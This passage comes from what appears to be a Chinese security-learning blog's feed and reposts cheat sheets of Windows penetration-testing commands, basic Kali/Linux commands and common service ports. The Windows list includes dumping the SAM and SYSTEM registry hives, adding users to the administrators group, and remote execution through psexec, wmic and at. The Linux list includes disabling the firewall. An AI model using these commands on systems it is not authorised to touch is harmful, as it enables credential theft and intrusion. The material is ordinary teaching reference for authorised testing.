查看当前在线的用户<br>net localgroup 查看所有的本地组<br>net localgroup administrators 查看administrators组中有哪些用户<br>net localgroup administrators 用户名 &#x2F;add 把用户添加到管理员组中<br>net start 查看开启服务<br>net start 服务名 开启某服务<br>net stop 服务名 停止某服务<br>net share 查看本地开启的共享<br>net share ipc$ 开启ipc$共享<br>net share ipc$ &#x2F;del 删除ipc$共享<br>net share c$ &#x2F;del 删除C：共享<br>\192.168.0.108\c 访问默认共享c盘<br>dsquery server 查看所有域控制器<br>dsquery subnet 查看域内内子网<br>dsquery group 查看域内工作组<br>dsquery site 查看域内站点<br>netstat -a 查看开启了哪些端口,常用netstat -an<br>netstat -n 查看端口的网络连接情况，常用netstat -an<br>netstat -v 查看正在进行的工作<br>netstat -p 协议名 例：netstat -p tcq&#x2F;ip 查看某协议使用情况（查看tcp&#x2F;ip协议使用情况）<br>netstat -s 查看正在使用的所有协议使用情况<br>nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写<br>reg save hklm\sam sam.hive 导出用户组信息、权限配置<br>reg save hklm\system system.hive 导出SYSKEY<br>net use \目标IP\ipc$ 密码 &#x2F;u:用户名 连接目标机器<br>at \目标IP 21:31 c:\server.exe 在某个时间启动某个应用<br>wmic &#x2F;node:”目标IP” &#x2F;password:”123456” &#x2F;user:”admin” 连接目标机器<br>psexec.exe \目标IP -u username -p password -s cmd 在目标机器上执行cmd<br>finger username @host 查看最近有哪些用户登陆<br>route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface<br>arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。<br>arp -a 将显示出全部信息<br>nslookup IP地址侦测器<br>tasklist 查看当前进程<br>taskkill &#x2F;pid PID数 终止指定PID进程<br>whoami 查看当前用户及权限<br>systeminfo 查看计算机信息（版本，位数，补丁情况）<br>ver 查看计算机操作系统版本<br>tasklist &#x2F;svc 查看当前计算机进程情况<br>netstat -ano 查看当前计算机进程情况<br>wmic product &gt; ins.txt 查看安装软件以及版本路径等信息，重定向到ins.txt</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Windows渗透测试中常用命令&quot;&gt;&lt;a href=&quot;#Windows渗透测试中常用命令&quot; class=&quot;headerlink&quot; title=&quot;Windows渗透测试中常用命令&quot;&gt;&lt;/a&gt;Windows渗透测试中常用命令&lt;/h1&gt;&lt;p&gt;ifconfig &amp;#x2F</summary>
      
    
    
    
    <category term="计算机基础知识" scheme="https://w-sqrt7.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="转载" scheme="https://w-sqrt7.github.io/tags/%E8%BD%AC%E8%BD%BD/"/>
    
    <category term="基础" scheme="https://w-sqrt7.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>kali的常用命令</title>
    <link href="https://w-sqrt7.github.io/2024/03/09/other/basic/kali%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>https://w-sqrt7.github.io/2024/03/09/other/basic/kali%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
    <published>2024-03-09T07:52:10.931Z</published>
    <updated>2024-03-09T07:53:15.861Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kali的常用命令"><a href="#kali的常用命令" class="headerlink" title="kali的常用命令"></a>kali的常用命令</h1><h2 id="1-常用命令"><a href="#1-常用命令" class="headerlink" title="1.常用命令"></a>1.常用命令</h2><p>passwd 修改密码</p><p>passwd root 修改root用户密码</p><p>date 显示系统日期</p><p>sudo 后面加命令 就可以调用管理权限</p><p>apt-get update 更新软件列表</p><p>这个命令，会访问源列表里的每个网址，并读取软件列表，然后保存在本地电脑。我们在新立得软件包管理器里看到的软件列表，都是通过update命令更新的。</p><p>apt-get upgrade 更新软件</p><p>这个命令，会把本地已安装的软件，与刚下载的软件列表里对应软件进行对比，如果发现已安装的软件版本太低，就会提示你更新。如果你的软件都是最新版本，会提示： 升级了 0 个软件包，新安装了 0 个软件包，要卸载 0 个软件包，有 0 个软件包未被升级。</p><p>apt-get dist-upgrade 更新软件  </p><p>apt-get upgrade 与 apt-get dist-upgrade 的区别</p><p>upgrade:系统将现有的Package升级,如果有相依性的问题,而此相依性需要安装其它新的Package或影响到其它Package的相依性时,此Package就不会被升级,会保留下来.</p><p>dist-upgrade:可以聪明的解决相依性的问题,如果有相依性问题,需要安装&#x2F;移除新的Package,就会试着去安装&#x2F;移除它.<br>(所以通常这个会被认为是有点风险的升级)</p><p>apt-get upgrade 和 apt-get dist-upgrade 本质上是没有什么不同的。</p><p>只不过，dist-upgrade<br>会识别出当依赖关系改变的情形并作出处理，而upgrade对此情形不处理。</p><p>例如软件包 a 原先依赖 b c d，但是在源里面可能已经升级了，现在是 a 依赖 b c e。这种情况下，dist-upgrade 会删除 d 安装 e，并把 a 软件包升级，而 upgrade 会认为依赖关系改变而拒绝升级 a<br>软件包。</p><p>clear 清屏</p><p>sudo gpedit 特权调用gpedit编辑器</p><p>reboot 重启</p><p>apt-get install XXXXX 安装缺少的依赖包，（XXX）里面输入缺少依赖包的名字</p><p>apt-get autoremove –purge 软件名 删除包及其依赖的软件包+配置文件等</p><p>apt-get install +模块名 这种方法也可以安装模块,或者apt-get install python-模块名</p><p>firefox 浏览器打开</p><p>shutdown -h now 关闭系统(1)</p><p>init 0 关闭系统(2)</p><p>telinit 0 关闭系统(3)</p><p>shutdown -h hours:minutes &amp; 按预定时间关闭系统</p><p>shutdown -c 取消按预定时间关闭系统</p><p>shutdown -r now 重启(1)</p><p>reboot 重启(2)</p><p>su -l 切换登陆用户</p><p>logout 注销用户登陆</p><p>pwd 当前路径</p><h2 id="2-文件夹或文本操作"><a href="#2-文件夹或文本操作" class="headerlink" title="2.文件夹或文本操作"></a>2.文件夹或文本操作</h2><p>cd .. 返回上一级目录</p><p>cd ..&#x2F;.. 返回上级两级目录</p><p>cd - 返回上次所在的目录</p><p>cd 文件夹名  进去文件夹</p><p>cd ~ 进去当前用户主目录</p><p>pwd 显示当前工作路径</p><p>touch 文件名  常见文件</p><p>cat 文件名 读取文档内容</p><p>mkdir 文件名 创建文件夹</p><p>mkdir -p 文件夹 递归创建文件夹</p><p>cp 复制命令</p><p>cp -r moon moons 复制moon 文件夹到当前 moons 如果有里面有文件 使用-r </p><p>mv 移动命令</p><p>mv moon moon 也可以说是改名</p><p>mkdir 文件名 文件名 创建多个文件夹</p><p>ls 显示文件和文件夹名</p><p>ls -a 显示所有的文件和文件夹 包含隐藏文件</p><p>ls -l 显示文件和目录的详细资料</p><p>删除</p><p>rm -f 文件  删除文件</p><p>rm 文件夹名 删除文件夹</p><p>rm -rf  文件&#x2F;文件夹  删除文件夹 及其目录下的文件</p><p>压缩和解压<br>bzip2 file1 压缩一个叫做 ‘file1’ 的文件</p><p>gunzip file1.gz 解压一个叫做 ‘file1.gz’的文件</p><p>gzip file1 压缩一个叫做 ‘file1’的文件</p><p>gzip -9 file1 最大程度压缩</p><p>rar a file1.rar test_file 创建一个叫做 ‘file1.rar’ 的包</p><p>rar x file1.rar 解压rar包</p><p>unrar x file1.rar 解压rar包</p><p>DEB 包 (Debian, Ubuntu 以及类似系统)<br>dpkg -i package.deb 安装&#x2F;更新一个 deb 包</p><p>dpkg -r package_name 从系统删除一个 deb 包</p><p>dpkg -l 显示系统中所有已经安装的 deb 包</p><p>dpkg -l | grep httpd 显示所有名称中包含 “httpd” 字样的deb包</p><p>dpkg -s package_name 获得已经安装在系统中一个特殊包的信息</p><p>dpkg -L package_name 显示系统中已经安装的一个deb包所提供的文件列表</p><p>dpkg –contents package.deb 显示尚未安装的一个包所提供的文件列表</p><p>tar zcvf +压缩文件名 压缩文件</p><p>tar zxvf +解压包名 解压文件</p><p>tar -jcvf renwolesshel.tar.bz2 打包</p><p>tar jxvf renwolesshel.tar.bz2 解压</p><p>压缩成zip格式</p><p>zip -q -r renwolesshel.zip renwolesshel&#x2F;<br>解压zip格式的压缩包</p><p>unzip renwolesshel.zip</p><p>which 加软件名 可以查出软件目录在哪</p><p>.&#x2F;+文件名或者apt-get +文件名 安装文件</p><h2 id="3-系统信息"><a href="#3-系统信息" class="headerlink" title="3.系统信息"></a>3.系统信息</h2><p>arch 显示机器的处理器架构(1)</p><p>uname -m 显示机器的处理器架构(2)</p><p>uname -r 显示正在使用的内核版本</p><p>cat &#x2F;proc&#x2F;version 显示内核的版本</p><p>cat &#x2F;proc&#x2F;net&#x2F;dev 显示网络适配器及统计</p><p>cat &#x2F;proc&#x2F;cpuinfo 显示CPU info的信息</p><p>cat &#x2F;proc&#x2F;mounts 显示已加载的文件系统</p><h2 id="4-vi-常用命令"><a href="#4-vi-常用命令" class="headerlink" title="4.vi 常用命令"></a>4.vi 常用命令</h2><h2 id="vi编辑器的概念"><a href="#vi编辑器的概念" class="headerlink" title="vi编辑器的概念"></a>vi编辑器的概念</h2><p>vi编辑器分为三种状态，分别是：<br>1.命令模式（command mode）<br>控制屏幕光标的移动，字符、字或行的删除，移动复制某区段及进入Insert mode下，或者到 last line mode。</p><p>2.插入模式（Insert mode）</p><p>只有在Insert mode下，才可以做文字输入，按「ESC」键可回到命令行模式。</p><p>3.底行模式（last line mode）</p><p>将文件保存或退出vi，也可以设置编辑环境，如寻找字符串、列出行号……等。</p><p><strong>打开</strong></p><p>vi filename :打开或新建文件，并将光标置于第一行首<br>vi +n filename ：打开文件，并将光标置于第n行首<br>vi + filename ：打开文件，并将光标置于最后一行首</p><p><strong>编辑</strong></p><p>i 在当前位置生前插入<br>I 在当前行首插入<br>a 在当前位置后插入<br>A 在当前行尾插入<br>o 在当前行之后插入一行<br>O 在当前行之前插入一行<br>编辑结束，按Esc返回命令模式</p><p><strong>基本查找</strong></p><p>&#x2F;text　　查找text，按n健查找下一个，按N健查找前一个。<br>?text　　查找text，反向查找，按n健查找下一个，按N健查找前一个。<br>查找很长的词，如果一个词很长，键入麻烦，可以将光标移动到该词上，按*或#键即可以该单词进行搜索，相当于&#x2F;搜索。而#命令相当于?搜索。</p><p><strong>删除</strong></p><p>删除当前行 dd<br>删除2行 2dd</p><p><strong>拷贝和粘贴</strong></p><p>yy 拷贝当前行<br>nyy 拷贝当前后开始的n行，比如2yy拷贝当前行及其下一行。<br>p  在当前光标后粘贴</p><p>区块拷贝</p><ol><li>将光标移动到要复制的文本开始的地方，按 v进入可视模式。</li><li>将光标移动到要复制的文本的结束的地方，按y复制。此时vim会自动将光标定位到选中文本的开始的地方，并退出可视模式。</li><li>我移动光标到文本结束的地方，按 p粘贴。</li></ol><p><strong>退出命令</strong></p><p>:wq 保存并退出<br>:q! 强制退出并忽略所有更改<br>:e! 放弃所有修改，并打开原来文件<br>:w保存修改</p><p><strong>显示行号</strong></p><p>set number</p><p>set nu</p><p>输入:n，代表跳转到第n行，如:100，就跳转到第100行。</p><p>撤销操作</p><p>u</p><p>vim与vi的区别</p><p>vim是vi的延申 vim编辑源码会高亮 vim的命令对vi是完全兼容的</p><h2 id="5-文件搜索"><a href="#5-文件搜索" class="headerlink" title="5.文件搜索"></a>5.文件搜索</h2><p>find &#x2F; -name file1 从 ‘&#x2F;’ 开始进入根文件系统搜索文件和目录</p><p>find &#x2F; -user user1 搜索属于用户 ‘user1’ 的文件和目录<br>find &#x2F;home&#x2F;user1 -name *.bin 在目录 ‘&#x2F; home&#x2F;user1’ 中搜索带有’.bin’ 结尾的文件<br>find &#x2F;usr&#x2F;bin -type f -atime +100 搜索在过去100天内未被使用过的执行文件<br>find &#x2F;usr&#x2F;bin -type f -mtime -10 搜索在10天内被创建或者修改过的文件</p><p>find . -name ‘<em>.php’ -mmin -30  查找最近30分钟修改的当前目录下的.php文件<br>find . -name ‘</em>.php’ -mtime 0<br>查找最近24小时修改的当前目录下的.php文件</p><p>find . -name ‘*.inc’ -mtime 0 -ls<br>查找最近24小时修改的当前目录下的.php文件，并列出详细信息</p><p>find . -type f -mtime 1</p><p>查找当前目录下，最近24-48小时修改过的常规文件。<br>find . -type f -mtime +1<br>查找当前目录下，最近1天前修改过的常规文件。</p><p>-atime 文件访问时间</p><p>-ctime 文件常见时间</p><p>-mtime文件修改时间</p><p>-mtime n : n为数字，意思为在n天之前的“一天之内”被更改过内容的文件<br>-mtime +n : 列出在n天之前（不含n天本身）被更改过内容的文件名<br>-mtime -n : 列出在n天之内（含n天本身）被更改过内容的文件名</p><p>-type f 代表一个普通格式的文件 二进制文件</p><p>-type d 代表文件夹</p><p>find &#x2F; -name *.rpm -exec chmod 755 ‘{}’ ; 搜索以 ‘.rpm’ 结尾的文件并定义其权限<br>find &#x2F; -xdev -name *.rpm 搜索以 ‘.rpm’ 结尾的文件，忽略光驱、捷盘等可移动设备<br>locate *.ps 寻找以 ‘.ps’ 结尾的文件 - 先运行 ‘updatedb’ 命令<br>whereis halt 显示一个二进制文件、源码或man的位置<br>which halt 显示一个二进制文件或可执行文件的完整路径</p><p>grep kali &#x2F;etc&#x2F;passwd grep关键词搜索</p><p>grep -r –include&#x3D;’*.php’ ‘@eval’ &#x2F; 查找包含一句话木马的php文件</p><p>find &#x2F; -name moonsec 2&gt;&#x2F;dev&#x2F;null   搜索某个文件&#x2F;文件夹 屏蔽出错信息</p><p>SCP命令</p><p>1.将远程服务器文件拷贝到本地服务器当前路径下<br>在本地服务器当前路径下，输入如下命令，回车后输入远程服务器的登录密码，即可将远程文件拷贝到本地服务器当前路径下。</p><p> scp <a href="mailto:&#x74;&#101;&#x73;&#116;&#x75;&#115;&#x65;&#114;&#x40;&#52;&#55;&#46;&#49;&#48;&#48;&#46;&#x32;&#52;&#55;&#x2e;&#x32;&#52;&#x30;">&#x74;&#101;&#x73;&#116;&#x75;&#115;&#x65;&#114;&#x40;&#52;&#55;&#46;&#49;&#48;&#48;&#46;&#x32;&#52;&#55;&#x2e;&#x32;&#52;&#x30;</a>:&#x2F;home&#x2F;testuser&#x2F;test.sql </p><p>2.将本地服务器文件推送到远程服务器<br>在本地服务器当前路径下，输入如下命令，回车后输入远程服务器的登录密码，即可将本地文件拷贝到远程服务器指定路径下。</p><p> scp test1.sql <a href="mailto:&#116;&#x65;&#x73;&#x74;&#x75;&#x73;&#101;&#114;&#64;&#52;&#55;&#x2e;&#x31;&#x30;&#48;&#x2e;&#50;&#x34;&#55;&#46;&#x32;&#x34;&#x30;">&#116;&#x65;&#x73;&#x74;&#x75;&#x73;&#101;&#114;&#64;&#52;&#55;&#x2e;&#x31;&#x30;&#48;&#x2e;&#50;&#x34;&#55;&#46;&#x32;&#x34;&#x30;</a>:&#x2F;home&#x2F;testuser&#x2F;</p><p>3.将远程服务器文件夹全部复制到本地服务器</p><p>scp -r <a href="mailto:&#x74;&#101;&#115;&#116;&#x75;&#115;&#x65;&#114;&#64;&#52;&#x37;&#x2e;&#x31;&#x30;&#x30;&#x2e;&#x32;&#52;&#55;&#x2e;&#x32;&#52;&#x30;">&#x74;&#101;&#115;&#116;&#x75;&#115;&#x65;&#114;&#64;&#52;&#x37;&#x2e;&#x31;&#x30;&#x30;&#x2e;&#x32;&#52;&#55;&#x2e;&#x32;&#52;&#x30;</a>:&#x2F;home&#x2F;testuser&#x2F; </p><p>4.将本地服务器文件夹全部复制到远程服务器</p><p>scp -r &#x2F;home&#x2F;testuser1&#x2F; <a href="mailto:&#x74;&#x65;&#x73;&#x74;&#117;&#x73;&#x65;&#x72;&#64;&#x34;&#55;&#x2e;&#49;&#48;&#x30;&#46;&#50;&#52;&#x37;&#46;&#x32;&#52;&#48;">&#x74;&#x65;&#x73;&#x74;&#117;&#x73;&#x65;&#x72;&#64;&#x34;&#55;&#x2e;&#49;&#48;&#x30;&#46;&#50;&#52;&#x37;&#46;&#x32;&#52;&#48;</a>:&#x2F;home&#x2F;testuser&#x2F;</p><h2 id="6-用户和群组"><a href="#6-用户和群组" class="headerlink" title="6.用户和群组"></a>6.用户和群组</h2><p>groupadd group_name 创建一个新用户组<br>groupdel group_name 删除一个用户组</p><p>cat &#x2F;etc&#x2F;group | grep group_name </p><p>usermod -a -G moontea k1把用户k1附加其他用户组</p><p>创建目录</p><p>useradd moonsec</p><p>passwd moonsec</p><p>创建用户以及分配目录</p><p>useradd -r -m -s &#x2F;bin&#x2F;bash moonsec</p><p>参数的意思：<br>-r 建立系统账号<br>-m 自动建立用户的登入目录<br>-s &#x2F;bin&#x2F;bash 指定用户登入后所使用的shell</p><p>切换用户</p><p>su - root 切换到root用户</p><p>su 用户名 切换到普通用户</p><h2 id="7-系统管理"><a href="#7-系统管理" class="headerlink" title="7.系统管理"></a>7.系统管理</h2><p>top</p><p>查看正在指向的程序信息</p><p>进程</p><p>ps -ef 查看所有进程信息</p><p>ps -ef | grep tomcat 查找指定进程</p><p>kill -9 id 强制杀死进程</p><p>env 当前的变量</p><p>查看系统变量</p><p>echo $PATH</p><p>hostname 查看主机名</p><p>history 查看历史命令</p><h2 id="8-查看磁盘信息"><a href="#8-查看磁盘信息" class="headerlink" title="8.查看磁盘信息"></a>8.查看磁盘信息</h2><p>df   默认不带单位，挂载点、总容量、已用、可用</p><p>df  -h   友好显示（带单位），很多命令的友好显示都是-h</p><h2 id="9-查看内存信息"><a href="#9-查看内存信息" class="headerlink" title="9.查看内存信息"></a>9.查看内存信息</h2><p>free   默认以KB为单位，总容量、已用、可用、缓存大小</p><p>free  -m   默认以MB为单位</p><p>free  -h   上面2种都不带单位、只显示数值，这种是友好显示的，会带单位G、M等</p><h2 id="10-查看环境变量"><a href="#10-查看环境变量" class="headerlink" title="10.查看环境变量"></a>10.查看环境变量</h2><p>echo  $JAVA_HOME<br>echo $PATH | grep jdk</p><h2 id="11开机自启"><a href="#11开机自启" class="headerlink" title="11开机自启"></a>11开机自启</h2><p>有很多程序往往都需要设置开机自启，比如tomcat、mysql、nginx等。</p><p>在&#x2F;etc&#x2F;rc.d&#x2F;rc.local文件中加入开机要自动执行的程序</p><p>vim &#x2F;etc&#x2F;rc.d&#x2F;rc.local</p><p>挂载一个windows网络共享</p><p>mount -t smbfs -o username&#x3D;user,password&#x3D;pass &#x2F;&#x2F;WinClient&#x2F;share &#x2F;mnt&#x2F;share </p><h2 id="12网卡配置"><a href="#12网卡配置" class="headerlink" title="12网卡配置"></a>12网卡配置</h2><p>vi &#x2F;etc&#x2F;network&#x2F;interfaces</p><p>auto eth0  &#x2F;&#x2F;指定网卡（根据ifconfig结果修改）<br>iface eth0 inet static  &#x2F;&#x2F;启动静态ip<br>address 192.168.0.66  &#x2F;&#x2F; 设置静态ip<br>netmask 255.255.255.0  &#x2F;&#x2F;子网掩码<br>gateway 192.168.0.1  &#x2F;&#x2F;指定网关</p><p>重启网络</p><p>service networking restart<br>或者：<br>systemctl restart networking</p><p>设置临时ip</p><p>ifconfig eth0 192.168.0.33</p><h2 id="13网卡DNS服务器"><a href="#13网卡DNS服务器" class="headerlink" title="13网卡DNS服务器"></a>13网卡DNS服务器</h2><p>vi &#x2F;etc&#x2F;resovl.conf</p><p>nameserver 114.114.114.114</p><p>重启网卡</p><p>service networking restart</p><p>systemctl restart networking</p><p>注意有时候重启才生效</p><h2 id="14-服务相关"><a href="#14-服务相关" class="headerlink" title="14.服务相关"></a>14.服务相关</h2><p>启动apache2服务器</p><p> &#x2F;etc&#x2F;init.d&#x2F;apache2 start</p><p>打开：&#x2F;etc&#x2F;init.d&#x2F;apache2 start<br>重启：&#x2F;etc&#x2F;init.d&#x2F;apache2 restart<br>关闭：&#x2F;etc&#x2F;init.d&#x2F;apache2 stop</p><p>启动网卡</p><p>&#x2F;etc&#x2F;init.d&#x2F;network start</p><p>网络相关</p><p>开启路由转发</p><p>echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward</p><h2 id="15-linux常用网络命令"><a href="#15-linux常用网络命令" class="headerlink" title="15.linux常用网络命令"></a><strong>15.linux常用网络命令</strong></h2><p>网络和监控命令类似于这些： hostname, ping, ifconfig, iwconfig, netstat, nslookup, traceroute, finger, telnet, ethtool 用于查看 linux 服务器 ip 地址，管理服务器网络配置，通过 telnet 和 ethernet 建立与 linux 之间的网络链接，查看 linux 的服务器信息等。下面让我们看看在 Linux 下的网络和监控命令的使用。</p><p>hostname 查看本机名</p><p>ping  一般用于测试网络是否通 内网icmp</p><p>ping <a href="http://www.baidu.com/">www.baidu.com</a> -c 3 执行3次</p><p>ifconfig 网卡信息</p><p>iwconfig 用于配置或获取无线网络设备信息</p><p>netstat </p><p>-a (all)显示所有选项，默认不显示LISTEN相关<br>-t (tcp)仅显示tcp相关选项<br>-u (udp)仅显示udp相关选项<br>-n 拒绝显示别名，能显示数字的全部转化成数字。<br>-l 仅列出有在 Listen (监听) 的服務状态</p><p>-p 显示建立相关链接的程序名<br>-r 显示路由信息，路由表<br>-e 显示扩展信息，例如uid等<br>-s 按各个协议进行统计<br>-c 每隔一个固定时间，执行该netstat命令。</p><p>提示：LISTEN和LISTENING的状态只有用-a或者-l才能看到</p><p>常用命令</p><p>netstat -ano</p><p>-an 查看当前所有已连接端口<br>-nlpt 查看当前所有tcp端口<br>-nlpu 查看当前所有udp端口<br>-nlpt | grep 80 查看所有80端口使用情况</p><p>netstat -lntup 查看所有的tcp和upd端口</p><p>nslookup </p><p>查询其他记录<br>直接查询返回的是A记录，我们可以指定参数，查询其他记录，比如AAAA、MX等。</p><p>nslookup -qt&#x3D;type domain [dns-server]<br>其中，type可以是以下这些类型：</p><p>A 地址记录<br>AAAA 地址记录<br>AFSDB Andrew文件系统数据库服务器记录<br>ATMA ATM地址记录<br>CNAME 别名记录<br>HINFO 硬件配置记录，包括CPU、操作系统信息<br>ISDN 域名对应的ISDN号码<br>MB 存放指定邮箱的服务器<br>MG 邮件组记录<br>MINFO 邮件组和邮箱的信息记录<br>MR 改名的邮箱记录<br>MX 邮件服务器记录<br>NS 名字服务器记录<br>PTR 反向记录<br>RP 负责人记录<br>RT 路由穿透记录<br>SRV TCP服务器信息记录<br>TXT 域名对应的文本信息<br>X25 域名对应的X.25地址记录</p><p>http协议</p><p>curl</p><p>wget</p><p>traceroute</p><p>traceroute是用来检测发出数据包的主机到目标主机之间所经过的网关数量的工具。traceroute的原理是试图以最小的TTL（存活时间）发出探测包来跟踪数据包到达目标主机所经过的网关，然后监听一个来自网关ICMP的应答。发送数据包的大小默认为38个字节。</p><p>-d 使用Socket层级的排错功能。<br>-f 设置第一个检测数据包的存活数值TTL的大小。<br>-F 设置勿离断位。<br>-g 设置来源路由网关，最多可设置8个。<br>-i 使用指定的网络界面送出数据包。<br>-I 使用ICMP回应取代UDP资料信息。<br>-m 设置检测数据包的最大存活数值TTL的大小。<br>-n 直接使用IP地址而非主机名称。<br>-p 设置UDP传输协议的通信端口。<br>-r 忽略普通的Routing Table，直接将数据包送到远端主机上。<br>-s 设置本地主机送出数据包的IP地址。<br>-t 设置检测数据包的TOS数值。<br>-v 详细显示指令的执行过程。<br>-w 设置等待远端主机回报的时间。</p><p>-x 开启或关闭数据包的正确性检验。</p><p>telnet</p><p>Linux telnet命令用于远端登入。</p><p>执行telnet指令开启终端机阶段作业，并登入远端主机。</p><p>现在多数用于检测某个端口是否开放</p><p>Finger</p><p>Finger是一种用户信息分享服务。它工作在TCP 79端口，可以用来公开用户的特定信息。Nmap的finger的脚本可以向Finger服务器发送请求，查询并获取用户的相关信息，如登录名、用户名、TTY类型、登录时间等。</p><p>ethtool 是用于查询及设置网卡参数的命令</p><h2 id="16-防火墙iptables"><a href="#16-防火墙iptables" class="headerlink" title="16.防火墙iptables"></a>16.防火墙iptables</h2><p>查看防火墙规则</p><p>iptalbes -L</p><p>清除规则</p><p>iptables -F</p><p>关闭防火墙 </p><p>&#x2F;etc&#x2F;init.d&#x2F;iptables stop</p><p>service iptables stop</p><p>安装：apt-get install ufw</p><p>关闭：ufw disable # To disable the firewall</p><p>开启：ufw enable # To enable the firewall</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;kali的常用命令&quot;&gt;&lt;a href=&quot;#kali的常用命令&quot; class=&quot;headerlink&quot; title=&quot;kali的常用命令&quot;&gt;&lt;/a&gt;kali的常用命令&lt;/h1&gt;&lt;h2 id=&quot;1-常用命令&quot;&gt;&lt;a href=&quot;#1-常用命令&quot; class=&quot;head</summary>
      
    
    
    
    <category term="计算机基础知识" scheme="https://w-sqrt7.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="转载" scheme="https://w-sqrt7.github.io/tags/%E8%BD%AC%E8%BD%BD/"/>
    
    <category term="基础" scheme="https://w-sqrt7.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
    <category term="kali" scheme="https://w-sqrt7.github.io/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>常用服务端口号</title>
    <link href="https://w-sqrt7.github.io/2024/03/09/other/basic/%E5%B8%B8%E7%94%A8%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3%E5%8F%B7/"/>
    <id>https://w-sqrt7.github.io/2024/03/09/other/basic/%E5%B8%B8%E7%94%A8%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3%E5%8F%B7/</id>
    <published>2024-03-09T07:04:38.838Z</published>
    <updated>2024-03-09T07:03:37.606Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常用服务端口号"><a href="#常用服务端口号" class="headerlink" title="常用服务端口号"></a>常用服务端口号</h1><h2 id="原文链接："><a href="#原文链接：" class="headerlink" title="原文链接："></a>原文链接：</h2><p><a href="https://developer.aliyun.com/article/850146">https://developer.aliyun.com/article/850146</a></p><p><a href="https://cloud.tencent.com/developer/article/1702021">https://cloud.tencent.com/developer/article/1702021</a></p><p><a href="https://blog.csdn.net/Geroge_Ming/article/details/109711897">https://blog.csdn.net/Geroge_Ming/article/details/109711897</a></p><p>端口号的范围是从1～65535</p><p>分为3大类：</p><p>（1） 公认端口（Well Known Ports）：从0到1023，它们紧密绑定于一些服务。通常这些端口的通讯明确表明了某种服务的协议。例如：80端口实际上总是HTTP通讯。</p><p>（2） 注册端口（Registered Ports）：从1024到49151，它们松散地绑定于一些服务。但是这些端口同样用于许多其它目的。例如：许多系统处理动态端口从1024左右开始。</p><p>（3） 动态和&#x2F;或私有端口（Dynamic and&#x2F;or Private Ports）：从49152到65535。<br> 理论上，不应为服务分配这些端口。<br> 实际上，机器通常从1024起分配动态端口。但也有例外：SUN的RPC端口从32768开始。</p><h2 id="常用端口"><a href="#常用端口" class="headerlink" title="常用端口"></a>常用端口</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">21端口：FTP 文件传输服务</span><br><span class="line">22端口：SSH协议、SCP（文件传输）、端口号重定向</span><br><span class="line">23/tcp端口：TELNET 终端仿真服务</span><br><span class="line">25端口：SMTP 简单邮件传输服务</span><br><span class="line">53端口：DNS 域名解析服务</span><br><span class="line">69/udp：TFTP</span><br><span class="line">80/8080/3128/8081/9098端口：HTTP协议代理服务器</span><br><span class="line">110/tcp端口：POP3（E-mail）</span><br><span class="line">119端口：Network </span><br><span class="line">123端口：NTP（网络时间协议）</span><br><span class="line">135、137、138、139端口： 局域网相关默认端口，应关闭</span><br><span class="line">161端口：SNMP（简单网络管理协议）</span><br><span class="line">389端口：LDAP（轻量级目录访问协议）、ILS（定位服务）</span><br><span class="line">443/tcp 443/udp：HTTPS服务器</span><br><span class="line">445端口：SMB（服务器消息快协议）</span><br><span class="line">465端口：SMTP（简单邮件传输协议）</span><br><span class="line">873端口：rsync</span><br><span class="line">1080端口：SOCKS代理协议服务器常用端口号、QQ</span><br><span class="line">1158端口：ORACLE EMCTL</span><br><span class="line">1433/tcp/udp端口：MS SQL*SERVER数据库server、MS SQL*SERVER数据库monitor</span><br><span class="line">1521端口：Oracle 数据库</span><br><span class="line">2100端口：Oracle XDB FTP服务</span><br><span class="line">3389端口：WIN2003远程登录</span><br><span class="line">3306端口：MYSQL数据库端口</span><br><span class="line">5432端口：postgresql数据库端口</span><br><span class="line">5601端口：kibana</span><br><span class="line">6379端口：Redis数据库端口</span><br><span class="line">8080端口：TCP服务端默认端口、JBOSS、TOMCAT、Oracle XDB（XML 数据库）</span><br><span class="line">8081端口：Symantec AV/Filter for MSE</span><br><span class="line">8888端口：Nginx服务器的端口</span><br><span class="line">9000端口：php-fpm</span><br><span class="line">9080端口：Webshpere应用程序</span><br><span class="line">9090端口：webshpere管理工具</span><br><span class="line">9200端口：Elasticsearch服务器端口</span><br><span class="line">10050端口：zabbix_server 10050</span><br><span class="line">10051端口：zabbix_agent</span><br><span 